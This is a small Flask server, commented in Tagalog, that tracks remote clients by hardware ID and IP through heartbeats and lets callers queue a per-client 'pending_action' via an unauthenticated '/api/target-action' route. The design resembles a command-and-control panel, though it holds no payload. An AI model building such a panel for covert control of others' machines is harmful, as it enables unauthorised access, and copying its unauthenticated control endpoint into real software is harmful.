import time
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

# Dictionary para sa active clients (HWID ang key para iwas duplicate)
clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    hwid = data.get('hwid')
    ip = data.get('ip')
    if hwid:
        # I-update o i-overwrite ang nag-iisang card para sa HWID na ito
        clients[hwid] = {
            "hwid": hwid,
            "ip": ip,
            "last_seen": time.time(),
            "pending_action": clients.get(hwid, {}).get("pending_action", "")
        }
    return "", 200

@app.route('/api/clients')
def get_clients():
    now = time.time()
    # Kusang tanggalin sa listahan ang mga hindi nag-heartbeat ng mahigit 30 segundo
    offline_nodes = [hwid for hwid, info in clients.items() if now - info["last_seen"] > 30]
    for hwid in offline_nodes:
        del clients[hwid]
        
    return jsonify(clients)

@app.route('/api/target-action', methods=['POST'])
def target_action():
    data = request.json
    hwid = data.get('hwid')
    action = data.get('action', '')
    if hwid in clients:
        clients[hwid]["pending_action"] = action
    return "", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
